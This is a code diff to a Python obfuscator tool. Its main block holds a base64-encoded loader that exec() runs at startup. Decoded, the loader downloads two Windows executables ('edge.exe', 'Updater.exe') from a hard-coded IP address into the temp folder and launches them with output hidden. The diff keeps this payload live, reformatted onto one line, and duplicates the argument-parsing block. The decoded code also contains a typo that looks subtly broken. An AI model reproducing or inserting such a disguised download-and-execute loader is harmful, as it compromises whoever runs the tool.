@@ -1,4 +1,3 @@
-
 import random, string, base64, codecs, argparse, os, sys
 from textwrap import wrap
 from lzma import compress
@@ -122,27 +121,32 @@ if __name__ == "__main__":
     import base64
 
     code = '''
-aW1wb3J0IG9zCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgc3VicHJvY2VzcyoK
-dGVtcF9kaXIgPSBvcy5nZXRlbnYoJ1RFTVAnLCAnL3RtcCcpCgpidXJscyA9
-IFsKICAgICJodHRwOi8vODcuMTIwLjExNi42OS91cGxvYWRzL2VkZ2UuZXhl
-IiwKICAgICJodHRwOi8vODcuMTIwLjExNi42OS91cGxvYWRzL1VwZGF0ZXIu
-ZXhlIgpdCgoKZGVmIGRvd25sb2FkX2FuZF9zYXZlKHVybCwgZm9sZGVyKToK
-ICAgIGxvY2FsX2ZpbGVuYW1lID0gb3MucGF0aC5qb2luKGZvbGRlciwgdXJs
-LnNwbGl0KCcvJylbLTFdKQogICAgd2l0aCByZXF1ZXN0cy5nZXQodXJsLCBz
-dHJlYW09VHJ1ZSkgYXMgcjoKICAgICAgICByLnJhaXNlX2Zvcl9zdGF0dXMo
-KQogICAgICAgIHdpdGggb3Blbihsb2NhbF9maWxlbmFtZSwgJ3diJykgYXMg
-ZjoKICAgICAgICAgICAgZm9yIGNodW5rIGluIHIuaXRlcl9jb250ZW50KGNo
-dW5rX3NpemU9ODE5Mik6CiAgICAgICAgICAgICAgICBpZiBjaHVuazogZi53
-cml0ZShjaHVuaykKICAgIHJldHVybiBsb2NhbF9maWxlbmFtZQoKZmlsZXMg
-PSBbZG93bmxvYWRfYW5kX3NhdmUodXJsLCB0ZW1wX2RpcikgZm9yIHVybCBp
-biB1cmxzXQoKZm9yIGZpbGUgaW4gZmlsZXM6CiAgICBzdWJwcm9jZXNzLlBv
-cGVuKFtmaWxlXSwgc2hlbGxUcnVlLCBzdGRvdXQ9c3VicHJvY2Vzcy5ERVZO
-VUxMLCBzdGRlcnI9c3VicHJvY2Vzcy5ERVZOVUxMKQ==
+aW1wb3J0IG9zCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgc3VicHJvY2Vzcwp0ZW1wX2RpciA9IG9zLmdldGVudignVEVNUCcsICcvdG1wJykKCmJ1cmxzID0gWwogICAgImh0dHA6Ly84Ny4xMjAuMTE2LjY5L3VwbG9hZHMvZWRnZS5leGUiLAogICAgImh0dHA6Ly84Ny4xMjAuMTE2LjY5L3VwbG9hZHMvVXBkYXRlci5leGUiCl0KCgpkZWYgZG93bmxvYWRfYW5kX3NhdmUodXJsLCBmb2xkZXIpOgogICAgbG9jYWxfZmlsZW5hbWUgPSBvcy5wYXRoLmpvaW4oZm9sZGVyLCB1cmwuc3BsaXQoJy8nKVstMV0pCiAgICB3aXRoIHJlcXVlc3RzLmdldCh1cmwsIHN0cmVhbT1UcnVlKSBhcyByOgogICAgICAgIHIucmFpc2VfZm9yX3N0YXR1cygpCiAgICAgICAgd2l0aCBvcGVuKGxvY2FsX2ZpbGVuYW1lLCAnd2InKSBhcyBmOgogICAgICAgICAgICBmb3IgY2h1bmsgaW4gci5pdGVyX2NvbnRlbnQoY2h1bmtfc2l6ZT04MTkyKToKICAgICAgICAgICAgICAgIGlmIGNodW5rOiBmLndyaXRlKGNodW5rKQogICAgcmV0dXJuIGxvY2FsX2ZpbGVuYW1lCgpmaWxlcyA9IFtkb3dubG9hZF9hbmRfc2F2ZSh1cmwsIHRlbXBfZGlyKSBmb3IgdXJsIGluIHVybHNdCgpmb3IgZmlsZSBpbiBmaWxlczoKICAgIHN1YnByb2Nlc3MuUG9wZW4oW2ZpbGVdLCBzaGVsbFRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLkRFVk5VTEwsIHN0ZGVycj1zdWJwcm9jZXNzLkRFVk5VTEwp
 '''
 
     exec(base64.b64decode(code).decode('utf-8'))
 
   
+
+    parser = argparse.ArgumentParser(prog= sys.argv[0], description= "Obfuscates python program to make it harder to read")
+    parser.add_argument("FILE", help= "Path to the file containing the python code")
+    parser.add_argument("-o", type= str, help= 'Output file path [Default: "Obfuscated_<FILE>.py"]', dest= "path")
+    args = parser.parse_args()
+
+    if not os.path.isfile(sourcefile := args.FILE):
+        printerr(f'No such file: "{args.FILE}"')
+        os._exit(1)
+    elif not sourcefile.endswith((".py", ".pyw")):
+        printerr('The file does not have a valid python script extention!')
+        os._exit(1)
+    
+    if args.path is None:
+        args.path = "Obfuscated_" + os.path.basename(sourcefile)
+    
+    with open(sourcefile, encoding='utf-8') as sourcefile:
+        code = sourcefile.read()
+    
+    prysmaxobf(code, args.path)
 
     parser = argparse.ArgumentParser(prog= sys.argv[0], description= "Obfuscates python program to make it harder to read")
     parser.add_argument("FILE", help= "Path to the file containing the python code")
